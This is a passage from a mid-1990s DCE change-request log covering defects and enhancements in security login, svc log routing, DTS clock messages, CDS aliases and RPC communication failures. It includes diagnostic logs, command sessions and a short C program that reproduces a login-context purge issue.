about 20 minutes I reran cdscp disable clerk and gor

# cdscp disable clerk
Binding incomplete (no object ID and no endpoint) (dce / rpc)
Binding incomplete (no object ID and no endpoint) (dce / rpc)
Binding incomplete (no object ID and no endpoint) (dce / rpc)
Binding incomplete (no object ID and no endpoint) (dce / rpc)

The advertizer then pick up a few more ticks but is still standing. I then
sent it a sig15 and it went away.



CR Number                     : 12526
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : secd
Short Description             : Extended Login audit points needed
Reported Date                 : 10/5/94
Found in Baseline             : 1.1
Found Date                    : 10/5/94
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/5/94 public]

Extended login audit points need to be added.  Opened as with a A1 
priority as this is currently tentatively planned to be fixed in
the unintegrated tree.

[1/22/95 public]

Changed categorization from defect to enhancement to reflect true
status for this OT.



CR Number                     : 12523
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : 
Short Description             : need command to reset the
disable field of login activity
Reported Date                 : 10/5/94
Found in Baseline             : 1.1, 1.2
Found Date                    : 10/5/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : nextrel
Fixed In Baseline             : 
Affected File(s)              : 
unintegrated/src/nosupport/security/login_reset/login_reset.c 
unintegrated/src/nosupport/security/login_reset/Makefile
unintegrated/src/nosupport/security/login_reset/glob.h
unintegrated/src/nosupport/security/login_reset/types.h
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/5/94 public]

Supply an admin command (login_reset) that will reset the disable field of
the login record in case an error is made in setting the disable
time interval and the account gets locked.

[10/12/94 public]

Removed from unintegrated list.

[11/23/94 public]

This functionality was supplied in the unintegrated tree.

[12/19/95 public]
Fixed in DCE 1.2.1

[12/19/95 public]

There is still some work involved to remove the login_reset
command from the nosupport tree and integrate it as part of
dcecp. I am reopening the defect to address that additional
work, but have downgraded the severity to B.

[7/24/96 public]
Close, but not quite correct.  This is not a bug in existing code (it's
new functionality that we wanted but wasn't committed to any schedule
so it never got done).  As such, it should be an enhancement request (and
an enhancement request for dcecp, not security itself).



CR Number                     : 12516
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 10474
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : svc
Short Description             : "*" for multiple routing doesn't work
Reported Date                 : 10/5/94
Found in Baseline             : 1.1
Found Date                    : 10/5/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/5/94 public]

I have to correct myself: The setting:

gds:general.2,asn1.2,apdu.1,ipc.2:BINFILE.2.2000:LOG%d

*:TEXTFILE.1.100:EXC%d;GOESTO:gds

doesn't work completely.
What happens is that EXC8392.1 is not correct.
Here is the binary logfile LOG8392.1 (what is correct): (from svcdumplog)

1994-10-05-19:34:16.655+02:00I----- gdsipcchk DEBUG1 gds ipc d23regproc.c 94 0x7affc268
ENTRY_d23_reg_proc (ptype = 5, dirid = 0, otype = 1)
1994-10-05-19:34:16.665+02:00I----- gdsipcchk DEBUG1 gds ipc d23regproc.c 183 0x7affc268
EXIT_d23_reg_proc (registration entry = 0)
1994-10-05-19:34:16.713+02:00I----- gdsipcchk NOTICE gds general d23svcserv.c 142 0x7affc268
RPC-server binding info: ncacn_ip_tcp:192.35.18.17[4894]
1994-10-05-19:34:16.722+02:00I----- gdsipcchk NOTICE gds general d23svcserv.c 142 0x7affc268
RPC-server binding info: ncadg_ip_udp:192.35.18.17[4962]
1994-10-05-19:34:51.673+02:00I----- gdsipcchk WARNING gds general d23svcserv.c 157 0x7affc268
The RPC-server could not be established because of a RPC-runtime failure (status = 0x16c9a016)
1994-10-05-19:34:51.678+02:00I----- gdsipcchk NOTICE gds general d23ipcchk.c 314 0x7affc268
Entry monitor process

And here is the EXC8392.1:

1994-10-05-19:34:51.673+02:00I----- gdsipcchk WARNING gds general d23svcserv.c 157 0x7affc268 The RPC-server could not be established because of a RPC-runtime failure (status = 0x16c9a016)
ipcchk NOTICE gds general d23svcserv.c 142 0x7affc268 RPC-server binding info: ncadg_ip_udp:192.35.18.17[4962]
1994-10-05-19:34:51.678+02:00I----- gdsipcchk NOTICE gds general d23ipcchk.c 314 0x7affc268 Entry monitor process

I think the "WARNING" overwrites the "NOTICE".
I noticed that immediately after starting gdsipcchk the EXC file was OK:

1994-10-05-19:34:16.713+02:00I----- gdsipcchk NOTICE gds general d23svcserv.c 142 0x7affc268 RPC-server binding info: ncacn_ip_tcp:192.35.18.17[4894]
1994-10-05-19:34:16.722+02:00I----- gdsipcchk NOTICE gds general d23svcserv.c 142 0x7affc268 RPC-server binding info: ncadg_ip_udp:192.35.18.17[4962]

Some seconds later the WARNING came in ...

Please not that the same setting without using the "*" works:

gds:general.1,ipc.2:BINFILE.2.2000:LOG%d

FATAL:TEXTFILE.1.100:EXC%d;GOESTO:gds
ERROR:GOESTO:FATAL
NOTICE:GOESTO:FATAL
WARNING:GOESTO:FATAL
NOTICE_VERBOSE:GOESTO:FATAL

So we use this routing specification - so we don't have to use the "*".

[1/13/94 public]
Won't make it for 1.1.  Some more investigation is needed to see
what's really going on here.



CR Number                     : 12503
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : 
Short Description             : need to include stdio.h to pick up FILE type
Reported Date                 : 10/5/94
Found in Baseline             : 1.1
Found Date                    : 10/5/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/5/94 public]

The file dce_server_sec.c needs to include stdio.h to pick up the
FILE typedef.  This file will not compile with the ANSI compiler
on DEC OSF/1 AXP unless stdio.h is included.

[10/05/94 public]
This is arguably a DEC OSF/1 threads porting bug.  Doesn't pthread.h
include cma.h which includes stdio.h?  Trivial tho the change may be
it is almost definitely way too late, but I'll see.



CR Number                     : 12476
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : rgy_edit
Short Description             : rgy_edit should print errors on stderr
Reported Date                 : 10/3/94
Found in Baseline             : 1.0.3a
Found Date                    : 10/3/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/client/admin/rgy_edit/tty_io.c
Sensitivity                   : public

[10/3/94 public]

rgy_edit prints error messages on stdout, instead of stderr. Note that
if this change goes through, some changes in tests will be necessary to
log all the output, because currently only stdout is redirected.
An example of this is in 

	src/test/security/api/moretests/rgy.sh



CR Number                     : 12473
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : svc
Short Description             : svc inconvenient functions
Reported Date                 : 10/3/94
Found in Baseline             : 1.1
Found Date                    : 10/3/94
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/3/94 public]

In order to implement SVC, a server must first do access checks then
call the half-dozen functions that exist in libdce.  This is awkward.
Either SVC should export a manager EPV (which ignores the handle_t
param) so that server-writers (and DCE doc writers :-) need only
document one function, or it should be possible to register a
callback function similar to rpc_mgmt_set_authorization_func.



CR Number                     : 12472
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : dtsd
Short Description             : Clock was set an ERROR message
Reported Date                 : 10/3/94
Found in Baseline             : 1.1b20
Found Date                    : 10/3/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : dts.sams
Sensitivity                   : public

[10/3/94 public]

Dtsd will print a message like this when it sets the clock:

1994-10-03-13:49:24.936-04:00I5.675 dtsd ERROR dts events logevent_v_ultrix.c 129 0x7affa020
Clock was set: old time = 1994-10-03-13:49:25.221-04:00I5.995, new time = 1994-10-03-13:49:24.896-04:00I5.665

Since setting the clock is not really an error, dtsd should
only report this as (at most) a WARNING, probably just a NOTICE.

The fix is to change the following in dts.sams to svc_c_sev_[warning,notice]:

start
code            dts_s_clockset
text            "Clock was set: old time = %s, new time = %s"
explanation     "The server has set the clock."
action          "None required."
sub-component   dts_s_events
attributes      svc_c_sev_error
		^^^^^^^^^^^^^^^  - change to correct severity
end

This message shows up twice when running the control/test_dtscp.ksh 
test on a clerk machine.



CR Number                     : 12470
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : servers
Short Description             : add "who started you"
Reported Date                 : 10/3/94
Found in Baseline             : 1.1
Found Date                    : 10/3/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/3/94 public]
I think it would be useful if, when dced started a server, it passed
down the UUID of the principal that issued the srvrconf_start call.
It would pass a NIL uuid if dced itself started the server (e.g., because
it's a boot-time startup).

[10/03/94 public]
Oops, meant to create this as deferred.



CR Number                     : 12469
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : dtsd
Short Description             : dtsd doesn't export its acl managerwhen server entry name changed
Reported Date                 : 10/3/94
Found in Baseline             : 1.1b20
Found Date                    : 10/3/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/3/94 public]

While running the dtscp tests, dtsd generates error messages to the effect
that it can't unregister its acl manager interfaces.  I believe
the dtscp dts functional test will also see this problem.

The dtscp tests modify the server entry name attribute, calling
the routine UnexportTimeService(), and then calling ExportTServiceToNS().
The unexport routine remove the acl manager interfaces from the endpoint
map however the export routine does not put them back.

This causes an error on shutdown or the next time 
UnexportTimeService is called:

root@tsunami % dcecp -c dts stop

1994-10-03-12:55:14.149-04:00I----- dtsd ERROR dts dtserror mgtacl.c 630 0x7affa020
Couldn't unregister the version 1.0 rdacl interface from the endpoint map: Not registered in endpoint map (dce / rpc)
1994-10-03-12:55:14.168-04:00I----- dtsd ERROR dts dtserror transport_rpc.c 1873 0x7affa020
Failed to unregister dtsd ACL manager interface: Not registered in endpoint map (dce / rpc)


The fix would be to move the export of the acl interfaces to 
ExportTServiceToNS() from DirectiveCreate().

[10/03/94 public]
DTS shouldn't need to export its ACL interface at all, since sec_acl_bind
imports with a NULL interface uuid.

[10/3/94 public]
Perhaps a poor choice of terms, dtsd needs to at least register
its acl manager with the endpoint map, which if you look closely
at the error above, is the real problem.  Right?

[10/03/94 public]
Right.  Sorry for the mis-lead.



CR Number                     : 12458
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : dtsd
Short Description             : serverentry change completes, but with error
Reported Date                 : 9/30/94
Found in Baseline             : 1.1b20
Found Date                    : 9/30/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : dtss_service_ncl.c
Sensitivity                   : public

[9/30/94 public]
The following command returns an error, but changes the serverentry 
attribute anyway

dcecp> dts modify -serverentry foo
Error: No permission for name service operation

dcecp> dts show
[...]
{serverprincipal hosts/ninja/self}
{serverentry foo}
{servergroup subsys/dce/dts-servers}
[[tom 10/3/94 public]
This is caused by the DirectiveSet() code in dtss_service_ncl.c.
The code unexports dtsd's bindings from the name space,
copies the new name in to the global variable, and then tries
to re-export itself to the new name.  If this fails (for instance with no
permissions), it returns this error without exporting again to the old name.

The correct code would probably save the original name, and if the
ExportToNS() call fails, restore the original name and call ExportToNS()
again.  I don't believe there is any other way to check for permissions
before unexporting from the original name.



CR Number                     : 12383
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cdsalias
Short Description             : creating multiple aliases with the same name reports no error.
Reported Date                 : 9/28/94
Found in Baseline             : 1.1
Found Date                    : 9/28/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/28/94 public]

I can create/delete the same alias name with no error reported.

   dcecp> cdsalias create /.../foo 
   dcecp> cdsal cat
   {CDS_CellAliases 
    {Primary /.../drkstr}
    {Alias /.../foo}}
   dcecp> cdsalias create /.../foo 
   dcecp> cdsal cat                 
   {CDS_CellAliases 
    {Primary /.../drkstr}
    {Alias /.../foo}}
   dcecp> cdsalias create /.../FOO 
   dcecp> cdsal cat                 
   {CDS_CellAliases 
    {Primary /.../drkstr}
    {Alias /.../foo}}
   dcecp> cdsalias delete /.../foo 
   dcecp> cdsalias cat             
   {CDS_CellAliases {Primary /.../drkstr}}
   dcecp> cdsalias delete /.../foo
   dcecp> cdsalias cat             
   {CDS_CellAliases {Primary /.../drkstr}}



CR Number                     : 12373
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 12389
Project Name                  : dce
H/W Ref Platform              : i486,hppa
S/W Ref Platform              : osf1,hpux
Component Name                : gds
Subcomponent Name             : gdsditadm
Short Description             : missing values in mask 21
Reported Date                 : 9/27/94
Found in Baseline             : 1.1
Found Date                    : 9/27/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/27/94 public]

Mask 21 does not display the value of the CDS attributes 'root dir UUID'
and 'root dir name' after they have been entered.

[09/28/94 public]
Sorry - not reproducable here. 
What I did was:
gdsditadm

- bind to default DSA
- add (structure rule 2) C=dd
- select attributes CDS-Cell and CDS-Replica
- enter: 

Namespace UUID: 1
Root dir UUID: 2
Root dir name: 3

Replica type :      MASTER 
Clearinghouse UUID: 4
Clearinghouse name: 5
Tower 1: 6
Tower 2: 7
Tower 3: 8
Tower 4: 9
Tower 5: 10

Adding and displaying this object works here on RIOS.
I'll check on HP and AT386.

[9/28/94 public]
Here are the values I used on the 486:

Namespace UUID:		1af95b54-da3d-11cd-bee1-0800092543e8
Root dir UUID:		1af95b54-da3d-11cd-bee1-0800092543e8
Root dir name:		/.../c=ie/o=paddys/ou=cork

Replica type:		MASTER
Clearinghouse UUID:	1a4d8b08-da3d-11cd-bee1-0800092543e8
Clearinghouse name:	/.../c=ie/o=paddys/ou=cork/prague_ch
Tower 1:		ncacn_ip_tcp:130.105.5.41[]
Tower 2:		ncadg_ip_udp:130.105.5.41[]
<rest of towers blank>

I also entered your values for Namespace and rootdir UUIDS, and root dir
name, since on the phone we discussed some problem causes.  I again
encountered the problem that Root dir UUID and root dir name are not
displayed.

I then deleted the CDS-cell attribute and re-added it.  Same problem.

This seems to be confined to the CDS-Cell attribute, and not the
CDS-Replica.

[09/28/94 public]
You are right - it fails on HP and AT386. It works on RIOS.
Unbelievable.

[9/28/94 public]
The interesting question is:  is this simply that the mask won't redisplay
the data (my initial assumption) or is the data not being stored?

[09/28/94 public]
The data is stored. I've switched on dua logging

D2_LOG_LEVEL=7
SVC_GDS_DBG="gds:*.$D2_LOG_LEVEL:BINFILE.1.100000:$D2_LOG_DIR/log%d"

and saw in the logfile that the same encoded octet string has been returned
as it has been entered:

43.12.2.1107.1.3.4.13 Maximum number of values: 1 representation: OctetString
attribute value, length: 6, offset: 8, representation: OctetString
     0  31 00 32 00 33 00                                   |1 2 3           |

But the interesting question is: Is the error in gdsditadm (which means 
that just the attribute isn't displayed right) or in CDS?
If it is in CDS then probably intercell can't work.
I'll debug this now.

[09/28/94 public]
Opened OT 12389 (for cds): x500_str_to_cell returns

  cell->root_uuid = NULL;
  cell->root_name = NULL;

[09/28/94 public]
Sorry, Rich: I forgot to mention that I used a version of 08/20 on RIOS.
This version used the old str_to_cell function (in gds/gda) which
is defuncted now. So, of course: It also doesn't work on RIOS.



CR Number                     : 12355
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : cdscp
Short Description             : Bad error message.
Reported Date                 : 9/27/94
Found in Baseline             : 1.1
Found Date                    : 9/27/94
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/27/94 public]

I cannot create a clearinghouse on a 486/osf1 machine. 
I am logged in as cell_admin I perform the command:

cdscp> create clearinghouse /.:/clrd_ch
Binding incomplete (no object ID and no endpoint) (dce / rpc)
Binding incomplete (no object ID and no endpoint) (dce / rpc)
Binding incomplete (no object ID and no endpoint) (dce / rpc)
Binding incomplete (no object ID and no endpoint) (dce / rpc)

(kevins@drkstr)(ksh:146) klist
DCE Identity Information:
        Warning: Identity information is not certified
        Global Principal: /.../drkstr/cell_admin
        Cell:      2410cef8-d924-11cd-aca1-0000c0f7de56 /.../drkstr
        Principal: 00000064-d924-21cd-ac00-0000c0f7de56 cell_admin
        Group:     0000000c-d924-21cd-ac01-0000c0f7de56 none
        Local Groups:
                0000000c-d924-21cd-ac01-0000c0f7de56 none
                000013ec-d924-21cd-bd01-0000c0f7de56 acct-admin
                000013ed-d924-21cd-bd01-0000c0f7de56 subsys/dce/sec-admin
                000013ee-d924-21cd-bd01-0000c0f7de56 subsys/dce/cds-admin
                000013ef-d924-21cd-bd01-0000c0f7de56 subsys/dce/dts-admin
                000013f2-d924-21cd-bd01-0000c0f7de56 subsys/dce/audit-admin

Identity Info Expires: 94/09/27:20:13:33
Account Expires:       never
Passwd Expires:        never

Kerberos Ticket Information:
Ticket cache: /opt/dcelocal/var/security/creds/dcecred_67f68e00
Default principal: cell_admin@drkstr
Server: krbtgt/drkstr@drkstr
        valid 94/09/27:10:13:33 to 94/09/27:20:13:33
Server: dce-rgy@drkstr
        valid 94/09/27:10:13:34 to 94/09/27:20:13:33
Server: dce-ptgt@drkstr
        valid 94/09/27:10:14:12 to 94/09/27:12:14:12
Client: dce-ptgt@drkstr Server: krbtgt/drkstr@drkstr
        valid 94/09/27:10:14:12 to 94/09/27:12:14:12
Client: dce-ptgt@drkstr Server: dce-rgy@drkstr
        valid 94/09/27:10:14:13 to 94/09/27:12:14:12

[melman 10/3/94 public] 
I have a vague memory of you needing to be root to do this, though the docs
don't say so.  Kevin can you reproduce as root?  You mention that this
happens on a 486.  Have you tried on an HP yet?

Made a P0 so that it is considered for hypercritical.  We had mentioned at
today's meeting and I didn't want it lost.

[10/3/94 public]
I've tried unsuccessfully to reproduce with BL19.  No need to be root.  I'll
try again with a more recent installation when I can.  Was the system
you ran cdscp from the root master or a secondary server?  What baseline 
was the above seen in?

[10/4/94 public]
Kevin will update later, but we know what the problem is.  cdsd wasn't
running and that was the error message returned.  This should changed to a
severity E "bad error message"-type defect.

[10/4/94 public]

This is a very bad error message. Something that gives a little more of a clue 
would be helpful. The component ownere couldn't even tell what the message 
meant.



CR Number                     : 12317
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : sec_login_purge_context doesn't kill contexts
Reported Date                 : 9/23/94
Found in Baseline             : 1.1b17
Found Date                    : 9/23/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/23/94 public]

A call to sec_login_purge_context is documented as deleting any external
credential cache and freeing up in-memory resources associated with a
login-context.  This doesn't seem to work for non-default login-contexts.

The program below demonstrates this.  It creates a login-context from a
key-table entry, copies the login-context handle, purges the context via one
copy of the handle, and then successfully access the context via the other
copy.

To run the program, create a test principal <prin>, use rgy_edit ktadd to
put <prin>'s key in a keytable <keyfile>, then run the program:

%test <prin> <keyfile>


Program test.c:

#include <stdio.h>
#include <dce/rgybase.h>
#include <dce/sec_login.h>
#include <dce/binding.h>
#include <dce/rpc.h>
#include <dce/dce_error.h>

sec_login_handle_t login_context;
sec_login_handle_t login_context_copy;
error_status_t error_status;

void display_dce_error(error_status_t st) {
    int stat;
    char error_text[1024];
    dce_error_inq_text(st, error_text, &stat);
    if (stat) fprintf(stderr, "Unknown message number\n");
    else fprintf(stderr, "DCE error: \"%s\"\n", error_text);
    fflush(stderr);
}
 
int verify_login_context(sec_login_handle_t lc,
                         unsigned32 * error_status) {
    signed32 exp;
    unsigned32 num_groups;
    signed32* group_set;

    fprintf(stdout, ">>>Checking login-context %ld\n", (long)lc);
    fflush(stdout);

    sec_login_get_expiration(lc,
                             &exp,
                             error_status);

    if ((*error_status != 0) && (*error_status != sec_login_s_not_certified)) {
        return 1;
    };


    sec_login_get_groups(lc,
                         &num_groups,
                         &group_set,
                         error_status);

    if ((*error_status != 0) && (*error_status != sec_login_s_not_certified)) {
        return 1;
    };


    fprintf(stdout, ">>>Exp: %ld\n", (long)exp);
    fprintf(stdout, ">>>num_groups: %ld\n", (long)num_groups);
    fflush(stdout);

/* Else return a success indication...                                      */
    return 0;

}


int main(int argc, char *argv[]) {

    unsigned_char_p_t prin_name = argv[1];
    unsigned32 used_kvno;
    boolean32 reset_passwd;
    sec_login_auth_src_t auth_src;
    void * keytab = argv[2];

    sec_login_setup_identity(prin_name,
                             sec_login_no_flags,
                             &login_context,
                             &error_status);

    if (error_status) {
        fprintf(stderr, "Error %X setting up identity\n", error_status);
        display_dce_error(error_status);
    } else fprintf(stderr, "sec_login_setup_identity OK.\n");
    fflush(stderr);


    sec_login_valid_from_keytable(login_context,
                                  rpc_c_authn_dce_secret,
                                  keytab,
                                  0,
                                  &used_kvno,
                                  &reset_passwd,
                                  &auth_src,
                                  &error_status);


    if (error_status) {
        fprintf(stderr, "Error %X validating context\n", error_status);
        display_dce_error(error_status);
    } else fprintf(stderr, "sec_login_valid_from_keytable OK.\n");
    fflush(stderr);

    login_context_copy = login_context;

    if (verify_login_context(login_context_copy, &error_status)) {
        fprintf(stderr, "Error %X checking context copy\n", error_status);
        display_dce_error(error_status);
    } else fprintf(stderr, "Context copy OK.\n");
    fflush(stderr);

    sec_login_purge_context(&login_context, &error_status);

    if (error_status)
        fprintf(stderr, "Error %X purging context\n", error_status);
    else fprintf(stderr, "Purged context...\n");
    fflush(stderr);


    if (verify_login_context(login_context_copy, &error_status)) {
        fprintf(stderr, "Error %X checking context copy\n", error_status);
        display_dce_error(error_status);
        fprintf(stderr, "This is expected\n");
    } else fprintf(stderr, "Error: Context copy still OK after purge!\n");
    fflush(stderr);

    return error_status;
}

[9/23/94 public]

Here's my guess.

The purge gets rid of the files on disk immediately.

The login handle is cached and reference-counted
and does not go away until the reference count drops
to zero.  E.G. if you call rpc_binding_set_auth_info()
with a login context and a binding handle, the login
handle isn't released until the binding handle is
freed. 

It's dangerous to alias login handles.  The
internal check for a valid context is not
particularly robust, so you could end up
extracting garbage from a minimally valid
login handle.

I'm curious as to why you consider this a 
P1 bug?  Does gssapi depend on the ability 
to "verify" an aliased login handle that
may have been purged elsewhere?

[9/23/94]

No, GSSAPI itself doesn't depend on it.  However, I ran into this during
the GSSAPI tests, and I want to make sure that GSSAPI's correctly freeing
any login-contexts it creates.  The only way I can see to do this is to
have the GSSAPI test program take a copy of the handle before it invokes
the GSSAPI routine that's expected to delete the context, and then check that
the copy fails afterwards.  Note that this does seem to work if the
login-context is created by dce_login (I assume the difference is that in this
case it's associated with a credential file), but not for a login-context
created via valid_from_keytable().

The test program in this OT doesn't use
the login-context to do any RPC ops, so I don't think it can be a refcount
issue - the only reference to this login-context should be the handle that
the program purges.

[9/23/94 public]

After further thought, I'm changing this to an
enhancement request.   Aliasing a login handle,
purging the original handle, and then attempting
to use the aliased handle, is equivalent to using
an uninitialized login handle variable.  The results
are indeterminate.

The implementation could be made more robust with
the addition of a magic number to the vm login handle
structure, but not by next Friday.

[12/20/95 public]
This was supposed to be an enhancement request, rather than a code
bug.  Therefore lowering priority to 2 from 1.



CR Number                     : 12315
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : rpc failures seen with dts and dfs
Reported Date                 : 9/23/94
Found in Baseline             : 1.1b18
Found Date                    : 9/23/94
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/23/94 public]

Sorry Tom ... this is the one of the few clues we have for the
terrible performance we in system test and DFS land are seeing
with DCE.

Breaking this out from CR 11913 :

Errors like:

1994-09-20-13:44:08.249-04:00I----- dtsd ERROR dts dtsdate time_request.c 685 0x
401bff28 RPC call ClerkRequstTime() to remote server failed: Communications fail
ure (dce / rpc)
1994-09-20-13:47:16.665-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7aff8550 Couldn't get remote server's principal name: Communications
failure (dce / rpc)
1994-09-20-17:54:38.502-04:00I----- dtsd ERROR dts dtsdate time_request.c 685 0x
401bf0a8 RPC call ClerkRequstTime() to remote server failed: Communications fail
ure (dce / rpc)
1994-09-21-11:25:36.172-04:00I----- dtsd ERROR dts dtsdate time_request.c 685 0x
401bf0a8 RPC call ClerkRequstTime() to remote server failed: Communications fail
ure (dce / rpc)
1994-09-21-11:25:43.036-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7aff8550 Couldn't get remote server's principal name: Communications
failure (dce / rpc)
1994-09-21-13:25:09.584-04:00I----- dtsd ERROR dts dtsdate time_request.c 685 0x
401bff28 RPC call ClerkRequstTime() to remote server failed: Who are you failed
(dce / rpc)

are seen in an otherwise healthy and IDLE cell. I know that this may have always
been occuring and that serviceability just makes it more visible BUT all this doesn't 
explain why we're getting comm failures. Note that since BOTH dts and dfs are 
seeing comm failures, both tcp and udp are a problem (at least I think that's
how it works).

I added Jean Hsiao to the list to see if he has any performance tools or tests
you can use to pursue this. Mike Burati feels auditing is suspect so system
test will be running idle cells with 3 dts servers with and without auditing.
Peter O. (cell with auditing) and I (cell without auditing) will update this
CR with what we find from this weekend.

[9/26/94 public]
BUILD: 18.2

CONFIG:	dce11 (HP)	sec, dts and flserver (dfs)
	dce8 (HP)	cds, dts and flserver (dfs)
	wolfboy (RIOS)	dts and flserver (dfs)

ALL MACHINES CONFIG'd WITH AUDITING OFF

no errors seen on dce11
1 error seen on dce8:
994-09-24-20:55:48.095-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7aff8388 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)

1 error seen on wolfboy:
1994-09-24-22:57:28.282-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x200b76a8 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)

Nothing significant was going on at either time that I know of - the cell was not
under any stress - the basic connectathon tests were running from dce8 to a 
fileset on wolfboy but each iteration only took 3-4 minutes so we'd have seen a LOT
more of those messages if the test was causing them. All iterations of the test passed
and the iterations at the times of these messages were just as fast as all the others.

[9/26/94 public]
For the record, (and to be fair) other cells did NOT show the problem:

BUILD: 18.2

For CR 12315, left 2 cells idle:

Cell 1:	DFS and AUDITING on - NO DTS COMM FAILURES
shades (i):	sec cds dts
cobbler (r):	dts flserver (dfs)
largo (h):	dts flserver (dfs)
spanky (h):	dts flserver (dfs)

Cell 2: DFS and AUDITING off - NO DTS COMM FAILURES
darkman (h):	sec dts
darla (h):	cds dts
rum (h):	dts

but the dcecp cell (which was also idle and had AUDITING on)
did show some comm failures... hard to find a pattern so far.

[9/28/94 public]
More data points using bl-19:
 - Ran a 3 server, 1 clerk cell overnight and saw no comm failures.
 - Rick ran the dced systems test using only DG for 3 hours and saw
   no comm failures.

Could it be random network load from OSF backups?

[9/29/94 public]
Note: This is still happening even after the fix for 12179 (slowness).
PeterO saw these problems again in bl20 today.  Also note that in the
kernel version of who_are_you, you will see who_are_you failed messages
